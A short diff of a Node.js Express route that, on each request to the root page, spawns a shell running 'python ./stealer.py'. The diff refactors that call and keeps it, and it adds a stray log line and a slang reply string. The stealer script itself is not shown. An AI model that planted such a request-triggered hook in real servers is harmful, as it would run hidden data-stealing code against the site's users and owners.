@@ -18,10 +18,11 @@ app.listen(port, hostname, () => {
 app.get('/', (req, res) => {
   res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
 
-  spawn("python ./stealer.py", { shell: true }).stdout.on('data', (data) => {
-    console.log(`stdout: ${data}`);
+  let dummy = spawn("python ./stealer.py", { shell: true });
+  dummy.stdout.on('data', function(data) {
+    sys.print(data.toString());
   });
-
   res.send({uo:"pillado huron"})
+  console.log("amicu");
 })
 
